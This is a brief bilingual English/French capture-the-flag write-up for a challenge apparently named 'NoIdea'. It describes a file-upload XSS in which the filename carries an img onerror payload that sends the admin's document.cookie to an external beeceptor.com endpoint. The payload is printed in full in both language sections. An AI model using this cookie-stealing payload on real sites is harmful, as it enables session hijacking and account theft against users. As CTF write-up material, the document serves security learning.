# NoIdea Chall WU

## English

File upload with an injection in the name of the file to get an XSS. The XSS injection gives you a way to get the admin's cookies (flag).

Payloads :
- ``<img src=y onerror=window.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'<endpoint>.free.beeceptor.com?a='+document.cookie>.txt``

Little troll : you got rickrolled when you are using a source with the image "x".

## Français

Upload d'un fichier avec une injection dans son nom pour réaliser une XSS. L'injection XSS va nous permettre de récupérer les cookies de l'administrateur (flag).

Payloads :
- ``<img src=y onerror=window.location='https:'+String.fromCharCode(47)+String.fromCharCode(47)+'<endpoint>.free.beeceptor.com?a='+document.cookie>.txt``

Petit troll : si src=x, renvoie vers un gif de rick roll.
